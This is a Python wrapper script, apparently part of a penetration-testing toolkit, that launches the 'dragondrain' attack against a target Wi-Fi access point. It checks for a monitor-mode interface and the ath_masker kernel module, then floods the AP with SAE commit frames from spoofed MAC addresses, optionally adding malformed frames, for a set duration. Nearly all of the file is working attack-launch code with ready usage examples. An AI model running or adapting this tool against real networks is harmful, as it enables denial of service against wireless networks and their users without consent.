#!/usr/bin/env python3
import argparse
import subprocess
import shutil
import sys
import os
sys.path.append(__file__.rsplit("/", 1)[0])

from ptlibs import ptjsonlib, ptprinthelper, ptmisclib
from ptlibs.ptprinthelper import ptprint

from _version import __version__


def is_module_loaded(name: str) -> bool:
    # Check if a kernel module is currently loaded
    try:
        with open('/proc/modules', 'r') as f:
            return any(line.split()[0] == name for line in f)
    except OSError as e:
        ptjsonlib_object.end_error(f"Failed to read /proc/modules: {e}", args_global.json)
        sys.exit(1)


def ensure_module_loaded(name: str):
    # Exit with error if required kernel module is not loaded
    if not is_module_loaded(name):
        ptjsonlib_object.end_error(f"Required kernel module '{name}' is not loaded.", args_global.json)
        sys.exit(1)


def ensure_interface_exists(iface: str):
    # Check if the specified network interface exists
    if not os.path.exists(f"/sys/class/net/{iface}"):
        ptjsonlib_object.end_error(f"Interface '{iface}' not found.", args_global.json)
        sys.exit(1)


def find_executable():
    # Locate the dragondrain executable in the system PATH
    exe = shutil.which('dragondrain')
    if exe:
        return exe
    ptjsonlib_object.end_error(
        "'dragondrain' executable not found in PATH. Please install it or add it to PATH.",
        args_global.json
    )
    sys.exit(1)  # Ensure exit after error


def build_dragondrain_command(executable, args):
    # Construct command line arguments for dragondrain based on user inputs
    cmd = [executable]
    cmd.extend(['-d', args.iface])                  # Monitor-mode interface
    cmd.extend(['-a', args.bssid])                  # Target AP BSSID
    cmd.extend(['-c', args.current_channel])        # Current channel
    cmd.extend(['-b', str(args.rate)])              # Bitrate
    cmd.extend(['-n', str(args.number_of_mac)])     # Number of spoofed MAC addresses
    cmd.extend(['-g', args.group])                  # Curve group
    cmd.extend(['-v', str(args.debug_level)])       # Debug level

    if args.malformed_frames:
        cmd.append('-m')                             # Malformed commit flag

    return cmd


def run_dragondrain(cmd, duration):
    # Execute dragondrain process with timeout handling
    ptprint("Executing command:", bullet_type="INFO", condition=not args_global.json)
    ptprint(" ".join(cmd), bullet_type="TEXT", condition=not args_global.json)

    proc = subprocess.Popen(cmd)
    try:
        proc.wait(timeout=duration)
    except subprocess.TimeoutExpired:
        ptprint(f"Attack duration of {duration} seconds expired. Terminating dragondrain...", 
                bullet_type="INFO", condition=not args_global.json)
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
    except KeyboardInterrupt:
        ptprint("Keyboard interrupt detected. Terminating dragondrain...", 
                bullet_type="INFO", condition=not args_global.json)
        proc.terminate()
        sys.exit(0)


def get_help():
    # Return the help information structure for the script
    return [
        {"description": ["Python wrapper for dragondrain attack tool."]},
        {"usage": ["ptdragondrain <options>"]},
        {"usage_example": [
            "ptdragondrain -i wlan0mon -b 00:11:22:33:44:55 -c 6 -g 21 -r 54 -n 256 -t 60",
            "ptdragondrain -i wlan1mon -b D4:01:C3:B6:B2:5A -c 9 -g 21 -r 54 -n 256 -mf",
        ]},
        {"options": [
            ["-i", "--iface",             "<interface>", "Monitor-mode interface"],
            ["-b", "--bssid",             "<bssid>",     "BSSID of the target AP"],
            ["-c", "--current-channel",   "<channel>",   "Current channel of the target AP"],
            ["-g", "--group",             "<group>",     "The curve group to use (19 or 21)"],
            ["-d", "--debug-level",       "<level>",     "Debug level (0 to 3; default: 1)"],
            ["-r", "--rate",              "<rate>",      "Bitrate of injected frames (e.g., 1, 6, 12, 24, 48, 54)"],
            ["-n", "--number-of-mac",     "<count>",     "Number of spoofed MAC addresses (default: 20)"],
            ["-mf", "--malformed-frames", "",            "Inject a malformed Commit after every spoofed one"],
            ["-t", "--time",              "<seconds>",   "Duration of the attack (in seconds)"],
            ["-v",  "--version",          "",            "Show script version and exit"],
            ["-h",  "--help",             "",            "Show this help message and exit"],
            ["-j",  "--json",             "",            "Output in JSON mode"],
        ]
        }
    ]


def parse_args():
    # Parse and validate command line arguments
    parser = argparse.ArgumentParser(
        description="Python wrapper for dragondrain attack tool."
    )

    # Command-line parameters definition
    parser.add_argument('-i', '--iface', required=True,
                        help="Monitor-mode interface")
    parser.add_argument('-b', '--bssid', required=True,
                        help="BSSID of the target AP")
    parser.add_argument('-c', '--current-channel', required=True,
                        help="Current channel of the target AP")
    parser.add_argument('-g', '--group', default='19',
                        help="The curve group to use (19 or 21)")
    parser.add_argument('-d', '--debug-level', type=int, default=1,
                        help="Debug level (0 to 3; default: 1)")
    parser.add_argument('-r', '--rate', type=float, default=1.0,
                        help="Bitrate of injected frames (e.g., 1, 6, 12, 24, 48, 54)")
    parser.add_argument('-n', '--number-of-mac', type=int, default=20,
                        help="Number of spoofed MAC addresses (default: 20)")
    parser.add_argument('-mf', '--malformed-frames', action='store_true',
                        help="Inject a malformed Commit after every spoofed one")
    parser.add_argument('-t', '--time', type=int, default=30,
                        help="Duration of the attack (in seconds)")
    parser.add_argument("-j", "--json", action="store_true",
                        help="Output in JSON mode")
    parser.add_argument("-v", "--version", action='version', 
                        version=f'{SCRIPTNAME} {__version__}')

    # Handle help request separately for custom formatting
    if len(sys.argv) == 1 or "-h" in sys.argv or "--help" in sys.argv:
        ptprinthelper.help_print(get_help(), SCRIPTNAME, __version__)
        sys.exit(0)

    args = parser.parse_args()
    ptprinthelper.print_banner(SCRIPTNAME, __version__, args.json, space=0)
    return args


def main():
    # Main execution function
    global SCRIPTNAME, args_global, ptjsonlib_object
    SCRIPTNAME = "ptdragondrain"
    ptjsonlib_object = ptjsonlib.PtJsonLib()
    args = parse_args()
    args_global = args

    # Perform pre-execution checks
    ensure_module_loaded('ath_masker')
    ensure_interface_exists(args.iface)

    # Find and run the dragondrain executable
    exe_path = find_executable()
    cmd = build_dragondrain_command(exe_path, args)
    run_dragondrain(cmd, args.time)

    # Finalize execution and report results
    ptjsonlib_object.set_status("finished")
    ptprint(ptjsonlib_object.get_result_json(), "", args_global.json)


if __name__ == "__main__":
    main()
